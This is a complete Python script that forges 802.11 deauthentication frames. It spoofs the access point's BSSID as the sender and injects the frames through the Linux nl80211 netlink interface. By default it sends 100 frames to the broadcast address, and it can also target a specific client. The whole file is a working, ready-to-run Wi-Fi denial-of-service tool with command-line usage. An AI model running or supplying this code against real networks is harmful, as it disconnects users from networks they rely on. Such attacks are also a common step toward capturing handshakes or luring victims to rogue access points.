#!/usr/bin/env python3
"""
Deauth injection via nl80211 CMD_FRAME.
Uses NLM_F_ACK, reads response properly (matches debug_deauth.py approach).
"""
import socket, struct, fcntl, sys, time

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def get_nl80211_family_id():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    attr = struct.pack('HH', 12, 2) + b'nl80211\0'
    genlhdr = struct.pack('BBH', 3, 1, 0)
    nlhdr = struct.pack('IHHII', 16+len(genlhdr)+len(attr), 16, NLM_F_REQUEST|NLM_F_ACK, 1, 0)
    s.send(nlhdr + genlhdr + attr)
    resp = s.recv(4096)
    off = 20
    nllen = struct.unpack_from('I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('HH', resp, off)
        if atype == 1:
            fid = struct.unpack_from('H', resp, off+4)[0]
            s.close()
            return fid
        off += (alen+3) & ~3
    s.close()
    return None

def get_ifindex(ifname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    result = fcntl.ioctl(sock.fileno(), 0x8933, struct.pack('256s', ifname.encode()))
    sock.close()
    return struct.unpack('i', result[16:20])[0]

def nla(atype, data):
    alen = 4 + len(data)
    padded = (alen+3) & ~3
    return struct.pack('HH', alen, atype) + data + b'\0'*(padded-alen)

def send_frame_checked(sock, fid, ifidx, freq, frame, seq_num):
    """Send frame and read response. Returns (success, error_code)."""
    attrs = nla(3, struct.pack('I', ifidx))
    attrs += nla(38, struct.pack('I', freq))
    attrs += nla(51, frame)
    attrs += struct.pack('HH', 4, 118)  # DONT_WAIT_FOR_ACK
    genlhdr = struct.pack('BBH', 59, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('IHHII', 16+len(payload), fid, NLM_F_REQUEST|NLM_F_ACK, seq_num, 0)
    sock.send(nlhdr + payload)

    # Read first response
    resp = sock.recv(4096)
    nltype = struct.unpack_from('H', resp, 4)[0]

    if nltype == 2:  # NLMSG_ERROR
        errno = struct.unpack_from('i', resp, 16)[0]
        return errno == 0, errno
    elif nltype == fid:  # nl80211 response (success with cookie)
        # May also get an ACK after this
        sock.settimeout(0.1)
        try:
            resp2 = sock.recv(4096)
            nltype2 = struct.unpack_from('H', resp2, 4)[0]
            if nltype2 == 2:
                errno = struct.unpack_from('i', resp2, 16)[0]
                sock.settimeout(2)
                return errno == 0, errno
        except socket.timeout:
            pass
        sock.settimeout(2)
        return True, 0
    return True, 0

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <iface> <bssid> [freq] [target] [count] [interval]")
        sys.exit(1)

    iface = sys.argv[1]
    bssid = bytes.fromhex(sys.argv[2].replace(':', ''))
    freq = int(sys.argv[3]) if len(sys.argv) > 3 else 2412
    target = bytes.fromhex(sys.argv[4].replace(':', '')) if len(sys.argv) > 4 else b'\xff\xff\xff\xff\xff\xff'
    count = int(sys.argv[5]) if len(sys.argv) > 5 else 100
    interval = float(sys.argv[6]) if len(sys.argv) > 6 else 0.1

    fid = get_nl80211_family_id()
    ifidx = get_ifindex(iface)
    print(f"[*] {iface} idx={ifidx} fid={fid}")
    print(f"[*] AP: {bssid.hex(':')} freq={freq} target: {target.hex(':')}")
    print(f"[*] Sending {count} deauth frames...")

    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    s.bind((0, 0))
    s.settimeout(2)

    ok = fail = 0
    last_err = 0

    for i in range(count):
        # Build deauth: SA=BSSID (spoofed as AP)
        frame = struct.pack('<HH', 0x00c0, 0)
        frame += target + bssid + bssid
        frame += struct.pack('<HH', (i & 0xfff) << 4, 7)

        if i == 0:
            print(f"  Frame hex ({len(frame)}b): {frame.hex()}")

        success, errno = send_frame_checked(s, fid, ifidx, freq, frame, i + 10)
        if success:
            ok += 1
        else:
            fail += 1
            last_err = errno
            if fail <= 3:
                print(f"  frame {i}: errno={errno}")

        if (i+1) % 25 == 0:
            print(f"  [{i+1}/{count}] ok={ok} fail={fail}")
        time.sleep(interval)

    s.close()
    if fail > 0:
        print(f"[!] Last error: {last_err}")
    print(f"[*] Done: {ok} ok, {fail} fail")

if __name__ == '__main__':
    main()
